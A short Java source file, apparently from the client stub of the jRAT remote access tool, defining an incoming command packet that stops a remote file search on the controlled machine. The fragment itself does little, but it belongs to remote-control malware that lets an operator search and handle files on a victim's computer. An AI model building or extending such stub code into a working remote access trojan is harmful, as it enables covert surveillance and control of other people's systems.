package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.FileSearch;

public class Packet54StopSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		FileSearch.stopSearch();
	}

}
